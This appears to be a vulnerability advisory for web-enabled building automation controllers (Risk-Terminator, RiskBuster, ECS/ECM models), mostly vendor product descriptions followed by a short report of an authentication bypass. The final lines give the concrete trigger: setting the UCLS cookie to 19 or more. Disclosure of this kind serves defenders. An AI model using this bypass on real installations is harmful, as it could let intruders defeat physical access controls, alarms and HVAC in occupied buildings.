Summary:
#1 The Risk-Terminator Web Graphic control BEMS (Building Energy Management System) are
designed to provide you with the latest in the Human Machine Interface (HMI) technology,
for completely monitoring and controlling management. It may be used singly for small and
medium sized facilities, could be linked together via the high-speed Ethernet to other
servers that suit to World Wide Web (WWW) or Local Area Network (LAN) for large and more
sophisticated applications. The Risk-Terminator practice Web basic conception that with
operation simply and conveniently, totally share risk and make sure of security. Even
remote sites may be controlled and monitored through Ethernet port, which base on standard
transferring protocol like XML, Modbus TCP/IP or BACnet or URL.

#2 The RiskBuster is a Web enabled network Router Server that uses Ethernet and TCP/IP
networking technologies. It incorporates an embedded web server that can deliver user-specific
web pages to any PC or mobile terminal running internet browser software. A user with an
appropriate security codes can made adjustment or monitor the network control unit form
any internet access point in the world. It also provides network management, integration
and process control functions for any existing or new building controllers and microprocessor
based equipments or system in buildings. The management function provided by the RiskBuster
such as trend log and alarm generation improves building controllers and microprocessor
based equipments or system management and audit trail capabilities. The integration function
provided by the RiskBuster allows seamless integration such as information sharing (read/write)
between building controllers and microprocessor based equipments or system without any need
of major upgrade or equipments replacement and allow cost saving. The process control functions
provided by the RiskBuster allow global control action to be implemented across any building
controllers and microprocessor based equipments or system to allow full building control. The
RiskBuster provide a truly cost effective solution for any building automation or high level
integration application. A truly Ethernet network compliant feature allows the RiskBuster to
be install anywhere in the building.

#3 ECM0000160 Digital Logic Controller (DLC) are Pre-programmed controller it intended for
Building Automate System; Environment control system; HVAC control system and other types of
equipment. Being fully programmable it ensures complete application versatility, allowing
specific products to be created according to customer requests. This controller is a configurable
unitary controller based on the 32bit series microcomputer, with an on-board clock, have two
RS-485 local bus.

#4 The ECS0000160 is a Router Controller for building and industry products based on various
microprocessors. It not only accessing information but also monitoring and controlling across
Internet directly. The ECS0000160 can totally replace and improve a typical system that always
has tedious panel and complex working process. An obviously benefit to our customers is that
ECS0000160 enabling them to interact with their systems anytime, anywhere, not only just allowed
to connect with singular specific operating system. It's like a whole package, which provides
browsers an easy platform to monitor and control the doors, alarms, devices, etc. that all
through web-pages operating, which works base on standard transmission Internet protocol. The
ECS0000160 provides a low industry cost. A truly friendly network interface which is simple
and easy to apply on factory floors. It supports from serial ports with options of RS485.

#5 HOME SERVER-EHC9246150 - This web basic home-server is with the specifications of hidden
installation, 32bits microcomputer and I/O Peripheral expansion circuit, which include: D/A
conversion circuit, A/D conversion circuit and optical isolation circuit, using default proportional,
integral and differential (P+I+D) and dead-zone control to control accurately. The controller
features contains the sensing system, proportional control systems, computing modules, control
modules, alarm detection system, and so on. It mainly used in building control, plant monitoring,
air monitoring, lighting and power control, the use of premises for buildings, factories, offices,
conference rooms, restaurants, hotels, etc.

Desc:
The BAS controller suffers from an authentication bypass vulnerability. An unauthenticated attacker
through cookie poisoning can bypass authentication and disclose sensitive information and circumvent
physical access controls in smart homes and buildings and manipulate HVAC.

Authentication Bypass
---------------------

- Authentication bypass happens by modifying the Cookie values.
- Setting the UCLS Cookie larger or equal to 19 bypasses security controls.
